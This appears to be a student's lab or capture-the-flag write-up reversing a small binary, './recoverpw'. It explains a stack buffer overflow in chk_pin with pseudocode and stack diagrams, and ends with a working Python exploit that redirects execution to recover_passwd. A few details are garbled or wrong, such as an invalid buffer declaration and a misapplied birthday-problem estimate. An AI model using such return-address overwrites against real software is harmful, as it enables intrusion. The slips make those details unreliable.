# Alice Write Up
### by Tilden Jackson (thjackso)
## Content
* [Binary Reversing](#reversing)
* [Vulnerability Details](#exploit-details)
* [Working Exploit](#working-exploit)
## Reversing
This code `./recoverpw` has 3 main functions to consider: `main, chk_pin, 
recover_passwd`. We start by running the code to take a look at what it does:
\
![After running it we are prompted for our one-time PIN. If we get it wrong we get authentication failed.](https://i.postimg.cc/V6HCVsP0/UserRun.png)

Looking deeper at the binary we can get a deeper look at how it works:
![Main function disassembled](https://i.postimg.cc/xCdm5JhS/MainFunc.png)
The main function generates a random number and uses that as the input for a function `chk_pin`. 

Looking at `chk_png` we see:
![Check Pin read-in](https://i.postimg.cc/3xg2xHmz/chk-pin1.png)
The function `chk_pin` takes a user input and stores it into a buffer. However the program uses read of 0x40bytes whereas the buffer is less than 0x40bytes allocated. This will allow us to attack this program with a buffer overflow

If we get the PIN correct we call `recover_passwd` which just prints out the password. If we get it wrong, we return -1 as fail.
![Check Pin check flow](https://i.postimg.cc/MG5R1bsD/chk-pin2.png)
That is the main functionality of the code because `recover_passwd` just prints out the password directly.

I will include the disassembled `recover_passwd` for completeness: 
![Recover Password](https://i.postimg.cc/5yYCdcf7/recover-passwd.png)

---
A pseudocode of this binary would look like: 
```
int chk_pin(int PIN);
void recover_passwd(); //print password

int main(){
	srand(time(NULL));
	int PIN = rand();
	if (chk_pin(PIN) == 0){
		...	
	}
}

int chk_pin(int PIN){
	char buf[0x28buf];
	if(write(...) == -1){
		error(...);
	}
	if (read(stdin, &buf, 0x40) == -1){
		error(...);
	}
	int inputPIN = atoi(buf);
	if (inputPIN == PIN){
		recover_passwd();
		return 0;
	} else{
		write(BAD);
		return -1;
	}
}
```
\
**Vulnerabilities**
There are actually two vulnerabilities here. One is taking advantage of the random number generation to brute-force/guess it which (using the birthday problem) we know will only take 1/2 \sqrt(2**64) attempts on average. This might take a while so if we cannot capture the random number through reading it with gdb--which would skip us needing to guess it--we need a different angle. 

The exploit we will use here is buffer overflow to write our own return address with the address of `recover_passwd`

## Exploit Details

There are no countermeasures in the program. Thus we can just directly exploit it by overfilling the buffer up to the return address of the function and put our own return address. The address we choose is important though. We must choose the address of `recover_passwd` however we must jump to `0x40129b` in `recover_passwd` which is right when it sets up the stack but after the push and endbrk64 call which will cause us to segfault due to alignment.

Normally the stack diagram of the `chk_pin` function looks like

```
| Addr relative to rbp | val |
------------------------------
| +0x8  | 0x0000000000401420 | normal return address
------------------------------ <- old(%rsp)
| +0x0  | ...                | old(rbp)
------------------------------ <- %rbp
| -0x4  | ...                | result of write @0x40136c            
------------------------------
| -0x8  | ...                | result of read  @0x40139a
------------------------------
|       |                    |
| -0x30 | Guessed PIN        | buf[0x28]
|       |                    |
------------------------------
| -0x34 | PIN                | arg1 to chk_pin 
------------------------------
| -0x40 |                    |
------------------------------ <-%rsp
```

We overflow the buf with 0x38 bytes and then put in our own return address to move the instruction pointer to where we want. After the exploit it will look like:
```
| Addr relative to rbp | val |
------------------------------
| +0x8 | 0x000000000040129b | return address
------------------------------ <- old(%rsp)
| +0x0  | aaaaaaaaa          | old(rbp)
------------------------------ <- %rbp
| -0x4  | aaaa               |       
------------------------------
| -0x8  | aaaa               |
------------------------------
|       |                    |
| -0x30 | aaaaaaaaaaaa...aaa | buf[0x28]
|       |                    |
------------------------------
| -0x34 | PIN                | arg1 to chk_pin 
------------------------------
| -0x40 |                    |
------------------------------ <-%rsp
```

## Working Exploit
The exploit is as we described and our alice.txt looks like this: `[b"a"*0x38+b"\x9b\x12\x40"]`
As a python script we would have:
```
#!/usr/bin/python3
# File: exploit.py

import struct
import subprocess

exploited_file = "./recoverpw"

new_ret_addr = 0x40129b
exploit = b"a"*0x38 + struct.pack("<Q",new_ret_addr)

print("Injecting:",exploit,end=f"\n\n{'-'*20}\n[{exploited_file}]\n")

subprocess.run([exploited_file], input=exploit)
```

\
To check we run `python3 exploit.py` in the same directory and we have
![Exploit Result](https://i.postimg.cc/R04K3bTh/exploit.png)
